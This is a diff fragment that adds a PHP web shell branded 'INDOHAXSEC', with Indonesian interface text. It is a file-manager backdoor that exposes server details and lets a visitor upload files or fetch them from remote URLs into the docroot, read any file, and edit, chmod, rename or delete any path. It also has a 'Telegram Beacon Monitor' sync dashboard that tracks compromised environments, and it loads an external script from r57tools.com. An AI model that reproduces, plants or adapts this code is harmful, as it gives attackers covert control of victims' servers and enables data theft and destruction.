+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-light);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+
+        ::selection {
+            background: var(--accent);
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <?php
+        // Handle sync dashboard request
+        $do = $_GET['do'] ?? '';
+        if ($do === 'sync_log') {
+            if (($_GET['action'] ?? '') === 'reset') {
+                @unlink(SVC_STATE);
+                $_SESSION['flash'] = '✔ Sync state di-reset.';
+                header('Location: ' . $_SERVER['PHP_SELF'] . '?do=sync_log');
+                exit;
+            }
+            if (($_GET['action'] ?? '') === 'clearlog') {
+                @unlink(SVC_LOG);
+                $_SESSION['flash'] = '✔ Debug log dibersihkan.';
+                header('Location: ' . $_SERVER['PHP_SELF'] . '?do=sync_log');
+                exit;
+            }
+
+            $state = [];
+            if (is_file(SVC_STATE)) {
+                $state = json_decode(@file_get_contents(SVC_STATE), true) ?: [];
+            }
+            $dbg_content = '';
+            if (is_file(SVC_LOG)) {
+                $dbg_content = @file_get_contents(SVC_LOG);
+                if (strlen($dbg_content) > 40000) {
+                    $dbg_content = "...[dipotong]...\n\n" . substr($dbg_content, -40000);
+                }
+            }
+            $flash = $_SESSION['flash'] ?? ''; unset($_SESSION['flash']);
+            ?>
+            <div class="header">
+                <div class="header-top">
+                    <div>
+                        <div class="title">SYNC DASHBOARD</div>
+                        <div class="title-sub">// Telegram Beacon Monitor</div>
+                    </div>
+                    <div class="header-actions">
+                        <a href="<?php echo $_SERVER['PHP_SELF']; ?>" class="btn">◄ KEMBALI</a>
+                        <form method="post" style="margin:0;">
+                            <button type="submit" name="logout_fm" class="logout-btn">Logout</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <?php if ($flash): ?><div class="message message-success"><?php echo htmlspecialchars($flash); ?></div><?php endif; ?>
+
+            <div class="sync-panel">
+                <div class="sync-toolbar">
+                    <a href="<?php echo $_SERVER['PHP_SELF']; ?>?do=sync_log&action=reset" class="btn btn-purple" onclick="return confirm('Hapus state? Sync akan trigger lagi.')">🔄 RESET STATE</a>
+                    <a href="<?php echo $_SERVER['PHP_SELF']; ?>?do=sync_log&action=clearlog" class="btn btn-purple" onclick="return confirm('Bersihkan debug log?')">🧹 CLEAR LOG</a>
+                    <a href="<?php echo $_SERVER['PHP_SELF']; ?>?_tp=f" class="btn btn-primary">⚡ FORCE TRIGGER</a>
+                    <a href="<?php echo $_SERVER['PHP_SELF']; ?>?_tp=r" class="btn btn-danger" onclick="return confirm('Reset + trigger sync sekarang?')">💥 RESET & TRIGGER</a>
+                </div>
+
+                <div class="sync-stats">
+                    <div class="sync-stat">
+                        <div class="sync-stat-label">Environment Tracked</div>
+                        <div class="sync-stat-value purple"><?php echo count($state); ?></div>
+                    </div>
+                    <div class="sync-stat">
+                        <div class="sync-stat-label">TTL Cooldown</div>
+                        <div class="sync-stat-value"><?php echo round(SVC_TTL / 3600); ?>h</div>
+                    </div>
+                    <div class="sync-stat">
+                        <div class="sync-stat-label">Log Size</div>
+                        <div class="sync-stat-value"><?php echo is_file(SVC_LOG) ? round(filesize(SVC_LOG)/1024, 1).'K' : '0K'; ?></div>
+                    </div>
+                    <div class="sync-stat">
+                        <div class="sync-stat-label">Status</div>
+                        <div class="sync-stat-value" style="color: var(--success);">ACTIVE</div>
+                    </div>
+                </div>
+
+                <h3>📊 ENVIRONMENT TRACKED (<?php echo count($state); ?>)</h3>
+                <div style="overflow-x: auto;">
+                <table class="sync-table">
+                    <thead>
+                        <tr><th>#</th><th>Fingerprint</th><th>Trigger Time</th><th>Selisih</th></tr>
+                    </thead>
+                    <tbody>
+                    <?php $i = 1; foreach ($state as $fp => $ts): ?>
+                        <tr>
+                            <td style="color:var(--text-muted);"><?php echo $i++; ?></td>
+                            <td class="fp-text"><?php echo htmlspecialchars(substr($fp, 0, 32)); ?>…</td>
+                            <td style="color:var(--text-muted);"><?php echo date('d/m/Y H:i:s', $ts); ?></td>
+                            <td style="color:var(--text-muted);"><?php echo round((time() - $ts) / 3600, 1); ?> jam lalu</td>
+                        </tr>
+                    <?php endforeach; ?>
+                    <?php if (!$state): ?>
+                        <tr><td colspan="4" style="text-align:center;padding:40px;color:var(--text-muted);">&gt; belum ada environment tercatat_</td></tr>
+                    <?php endif; ?>
+                    </tbody>
+                </table>
+                </div>
+            </div>
+
+            <div class="sync-panel">
+                <h3>🐛 DEBUG LOG (.cache_sync.log)</h3>
+                <p style="color:var(--text-muted);font-size:11px;margin-bottom:12px;font-family:'JetBrains Mono',monospace;">
+                    File: <?php echo htmlspecialchars(SVC_LOG); ?><br>
+                    Size: <?php echo is_file(SVC_LOG) ? round(filesize(SVC_LOG)/1024, 2).' KB' : '(tidak ada)'; ?>
+                </p>
+                <textarea readonly class="sync-log-area"><?php echo htmlspecialchars($dbg_content ?: '(log kosong / belum ada)'); ?></textarea>
+            </div>
+
+            <div class="footer">INDOHAXSEC &copy; <?php echo date("Y"); ?> · SYNC MODULE v5</div>
+            </div>
+            </body></html>
+            <?php
+            exit;
+        }
+        ?>
+
+        <div class="header">
+            <div class="header-top">
+                <div>
+                    <div class="title">INDOHAXSEC</div>
+                    <div class="title-sub">// File Manager Terminal</div>
+                </div>
+                <div class="header-actions">
+                    <a href="<?php echo $_SERVER['PHP_SELF']; ?>?do=sync_log" class="sync-btn">📡 Sync Dashboard</a>
+                    <form method="post" style="margin: 0;">
+                        <button type="submit" name="logout_fm" class="logout-btn">Logout</button>
+                    </form>
+                </div>
+            </div>
+            
+            <?php
+            set_time_limit(0);
+            error_reporting(0);
+
+            $disfunc = @ini_get("disable_functions");
+            if (empty($disfunc)) {
+                $disf = "<span class='writable'>NONE</span>";
+            } else {
+                $disf = "<span class='readonly'>".$disfunc."</span>";
+            }
+
+            function author() {
+                echo '<div class="footer">INDOHAXSEC &copy; '.date("Y").'</div>';
+                exit();
+            }
+
+            function cekdir() {
+                if (isset($_GET['path'])) {
+                    $lokasi = $_GET['path'];
+                } else {
+                    $lokasi = getcwd();
+                }
+                if (is_writable($lokasi)) {
+                    return "<span class='writable'>writable</span>";
+                } else {
+                    return "<span class='readonly'>readonly</span>";
+                }
+            }
+
+            function cekroot() {
+                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
+                    return "<span class='writable'>writable</span>";
+                } else {
+                    return "<span class='readonly'>readonly</span>";
+                }
+            }
+
+            function xrmdir($dir) {
+                $items = scandir($dir);
+                foreach ($items as $item) {
+                    if ($item === '.' || $item === '..') {
+                        continue;
+                    }
+                    $path = $dir.'/'.$item;
+                    if (is_dir($path)) {
+                        xrmdir($path);
+                    } else {
+                        unlink($path);
+                    }
+                }
+                rmdir($dir);
+            }
+
+            function green($text) {
+                echo "<div class='message message-success'>".$text."</div>";
+            }
+
+            function red($text) {
+                echo "<div class='message message-error'>".$text."</div>";
+            }
+            ?>
+
+            <div class="system-info">
+                <div class="info-line">
+                    <span class="info-label">Server:</span>
+                    <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
+                </div>
+                <div class="info-line">
+                    <span class="info-label">System:</span>
+                    <span class="info-value"><?php echo php_uname(); ?></span>
+                </div>
+                <div class="info-line">
+                    <span class="info-label">User:</span>
+                    <span class="info-value"><?php echo @get_current_user()." (".@getmyuid().")"; ?></span>
+                </div>
+                <div class="info-line">
+                    <span class="info-label">PHP:</span>
+                    <span class="info-value"><?php echo @phpversion(); ?></span>
+                </div>
+                <div class="info-line" style="grid-column: 1 / -1;">
+                    <span class="info-label">Disabled:</span>
+                    <span class="info-value"><?php echo $disf; ?></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="breadcrumb">
+            <?php
+            foreach($_POST as $key => $value){
+                $_POST[$key] = stripslashes($value);
+            }
+
+            if(isset($_GET['path'])){
+                $lokasi = $_GET['path'];
+                $lokdua = $_GET['path'];
+            } else {
+                $lokasi = getcwd();
+                $lokdua = getcwd();
+            }
+
+            $lokasi = str_replace('\\','/',$lokasi);
+            $lokasis = explode('/',$lokasi);
+            $lokasinya = @scandir($lokasi);
+
+            echo "$ pwd: ";
+            foreach($lokasis as $id => $lok){
+                if($lok == '' && $id == 0){
+                    $a = true;
+                    echo '<a href="?path=/">/</a>';
+                    continue;
+                }
+                if($lok == '') continue;
+                echo '<a href="?path=';
+                for($i=0;$i<=$id;$i++){
+                    echo "$lokasis[$i]";
+                    if($i != $id) echo "/";
+                } 
+                echo '">'.$lok.'</a>/';
+            }
+            ?>
+        </div>
+
+        <div class="upload-section">
+            <div class="section-title">Upload Files</div>
+
+            <?php
+            if (isset($_POST['upwkwk'])) {
+                if (isset($_POST['berkasnya'])) {
+                    if ($_POST['dirnya'] == "2") {
+                        $lokasi = $_SERVER['DOCUMENT_ROOT'];
+                    }
+                    $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
+                    if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
+                        green("File uploaded: ".$lokasi."/".$_FILES['berkas']['name']);
+                    } else {
+                        red("Upload failed");
+                    }
+                } elseif (isset($_POST['linknya'])) {
+                    if (empty($_POST['namalink'])) {
+                        red("Filename cannot be empty");
+                    } else {
+                        if ($_POST['dirnya'] == "2") {
+                            $lokasi = $_SERVER['DOCUMENT_ROOT'];
+                        }
+                        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
+                        if (file_exists($lokasi."/".$_POST['namalink'])) {
+                            green("File uploaded: ".$lokasi."/".$_POST['namalink']);
+                        } else {
+                            red("Upload failed");
+                        }
+                    }
+                }
+            }
+            ?>
+
+            <form enctype="multipart/form-data" method="post">
+                <div class="form-row">
+                    <div class="radio-group">
+                        <label class="radio-item">
+                            <input type="radio" value="1" name="dirnya" checked>
+                            <span>current [<?php echo cekdir(); ?>]</span>
+                        </label>
+                        <label class="radio-item">
+                            <input type="radio" value="2" name="dirnya">
+                            <span>docroot [<?php echo cekroot(); ?>]</span>
+                        </label>
+                    </div>
+                </div>
+
+                <input type="hidden" name="upwkwk" value="aplod">
+                
+                <div class="form-row">
+                    <div class="upload-row">
+                        <input type="file" name="berkas">
+                        <button type="submit" name="berkasnya" class="btn btn-primary">Upload</button>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="upload-row">
+                        <input type="text" name="darilink" placeholder="https://example.com/file.txt">
+                        <input type="text" name="namalink" placeholder="filename">
+                        <button type="submit" name="linknya" class="btn btn-primary">Fetch</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <?php
+        if (isset($_GET['fileloc'])) {
+            echo "<div class='file-preview'>";
+            echo "<div class='section-title'>File: ".$_GET['fileloc']."</div>";
+            echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
+            echo "</div>";
+            author();
+        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
+            if (is_dir($_POST['path'])) {
+                xrmdir($_POST['path']);
+                if (file_exists($_POST['path'])) {
+                    red("Failed to delete directory");
+                } else {
+                    green("Directory deleted");
+                }
+            } elseif (is_file($_POST['path'])) {
+                @unlink($_POST['path']);
+                if (file_exists($_POST['path'])) {
+                    red("Failed to delete file");
+                } else {
+                    green("File deleted");
+                }
+            }
+        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+            echo "<div class='edit-form'>";
+            echo "<div class='section-title'>chmod ".$_POST['path']."</div>";
+            echo '<form method="post">
+            <div class="form-row">
+                <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" placeholder="0644" />
+                <input type="hidden" name="path" value="'.$_POST['path'].'">
+                <input type="hidden" name="pilih" value="ubahmod">
+                <button type="submit" name="chm0d" class="btn btn-primary">Apply</button>
+            </div>
+            </form>';
+            if (isset($_POST['chm0d'])) {
+                $cm = @chmod($_POST['path'], $_POST['perm']);
+                if ($cm == true) {
+                    green("Permission changed");
+                } else {
+                    red("Permission change failed");
+                }
+            }
+            echo "</div>";
+        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
+            if (isset($_POST['gantin'])) {
+                $ren = @rename($_POST['path'], $_POST['newname']);
+                if ($ren == true) {
+                    green("Renamed successfully");
+                } else {
+                    red("Rename failed");
+                }
+            }
+            if (empty($_POST['name'])) {
+                $namaawal = $_POST['newname'];
+            } else {
+                $namawal = $_POST['name'];
+            }
+            echo "<div class='edit-form'>";
+            echo "<div class='section-title'>mv ".$_POST['path']."</div>";
+            echo '<form method="post">
+            <div class="form-row">
+                <input name="newname" type="text" value="'.$namaawal.'" placeholder="new name" />
+                <input type="hidden" name="path" value="'.$_POST['path'].'">
+                <input type="hidden" name="pilih" value="gantinama">
+                <button type="submit" name="gantin" class="btn btn-primary">Rename</button>
+            </div>
+            </form>';
+            echo "</div>";
+        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+            if (isset($_POST['gasedit'])) {
+                $edit = @file_put_contents($_POST['path'], $_POST['src']);
+                if ($edit == true) {
+                    green("File saved");
+                } else {
+                    red("Save failed");
+                }
+            }
+            echo "<div class='edit-form'>";
+            echo "<div class='section-title'>nano ".$_POST['path']."</div>";
+            echo '<form method="post">
+            <textarea name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
+            <div class="form-row">
+                <input type="hidden" name="path" value="'.$_POST['path'].'">
+                <input type="hidden" name="pilih" value="edit">
+                <button type="submit" name="gasedit" class="btn btn-primary">Save</button>
+            </div>
+            </form>';
+            echo "</div>";
+        }
+        ?>
+<script src="https://r57tools.com/yazciz/ciz.js"></script>
+        <div class="file-table">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th style="width: 80px;">Size</th>
+                        <th style="width: 100px;">Permissions</th>
+                        <th style="width: 120px;">Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php
+                    foreach($lokasinya as $dir){
+                        if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
+                        echo "<tr>
+                        <td>
+                            <a href=\"?path=".$lokasi."/".$dir."\" class='file-link dir-link'>
+                                📁 ".$dir."
+                            </a>
+                        </td>
+                        <td class='size'>--</td>
+                        <td class='permissions ";
+                        if(is_writable($lokasi."/".$dir)) echo 'writable';
+                        elseif(!is_readable($lokasi."/".$dir)) echo 'readonly';
+                        echo "'>".statusnya($lokasi."/".$dir)."</td>
+                        <td>
+                            <form method='POST' action='?pilihan&path=$lokasi' class='action-form'>
+                                <select name='pilih'>
+                                    <option value=''>--</option>
+                                    <option value='hapus'>rm</option>
+                                    <option value='ubahmod'>chmod</option>
+                                    <option value='gantinama'>mv</option>
+                                </select>
+                                <input type='hidden' name='type' value='dir'>
+                                <input type='hidden' name='name' value='$dir'>
+                                <input type='hidden' name='path' value='$lokasi/$dir'>
+                                <button type='submit' class='btn'>go</button>
+                            </form>
+                        </td>
+                        </tr>";
+                    }
+
+                    foreach($lokasinya as $file) {
+                        if(!is_file("$lokasi/$file")) continue;
+                        $size = filesize("$lokasi/$file")/1024;
+                        $size = round($size,3);
+                        if($size >= 1024){
+                            $size = round($size/1024,2).'M';
+                        } else {
+                            $size = $size.'K';
+                        }
+
+                        echo "<tr>
+                        <td>
+                            <a href=\"?fileloc=$lokasi/$file&path=$lokasi\" class='file-link'>
+                                📄 $file
+                            </a>
+                        </td>
+                        <td class='size'>".$size."</td>
+                        <td class='permissions ";
+                        if(is_writable("$lokasi/$file")) echo 'writable';
+                        elseif(!is_readable("$lokasi/$file")) echo 'readonly';
+                        echo "'>".statusnya("$lokasi/$file")."</td>
+                        <td>
+                            <form method='post' action='?pilihan&path=$lokasi' class='action-form'>
+                                <select name='pilih'>
+                                    <option value=''>--</option>
+                                    <option value='hapus'>rm</option>
+                                    <option value='ubahmod'>chmod</option>
+                                    <option value='gantinama'>mv</option>
+                                    <option value='edit'>nano</option>
+                                </select>
+                                <input type='hidden' name='type' value='file'>
+                                <input type='hidden' name='name' value='$file'>
+                                <input type='hidden' name='path' value='$lokasi/$file'>
+                                <button type='submit' class='btn'>go</button>
+                            </form>
+                        </td>
+                        </tr>";
+                    }
+                    ?>
+                </tbody>
+            </table>
+        </div>
+
+        <?php
+        author();
+
+        function statusnya($file){
+            $statusnya = fileperms($file);
+
+            if (($statusnya & 0xC000) == 0xC000) {
+                $ingfo = 's';
+            } elseif (($statusnya & 0xA000) == 0xA000) {
+                $ingfo = 'l';
+            } elseif (($statusnya & 0x8000) == 0x8000) {
+                $ingfo = '-';
+            } elseif (($statusnya & 0x6000) == 0x6000) {
+                $ingfo = 'b';
+            } elseif (($statusnya & 0x4000) == 0x4000) {
+                $ingfo = 'd';
+            } elseif (($statusnya & 0x2000) == 0x2000) {
+                $ingfo = 'c';
+            } elseif (($statusnya & 0x1000) == 0x1000) {
+                $ingfo = 'p';
+            } else {
+                $ingfo = 'u';
+            }
+
+            $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
+            $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
+            $ingfo .= (($statusnya & 0x0040) ?
+                (($statusnya & 0x0800) ? 's' : 'x' ) :
+                (($statusnya & 0x0800) ? 'S' : '-'));
+
+            $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
+            $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
+            $ingfo .= (($statusnya & 0x0008) ?
+                (($statusnya & 0x0400) ? 's' : 'x' ) :
+                (($statusnya & 0x0400) ? 'S' : '-'));
+
+            $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
+            $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
+            $ingfo .= (($statusnya & 0x0001) ?
+                (($statusnya & 0x0200) ? 't' : 'x' ) :
+                (($statusnya & 0x0200) ? 'T' : '-'));
+
+            return $ingfo;
+        }
+        ?>
+    </div>
+</body>
+</html>
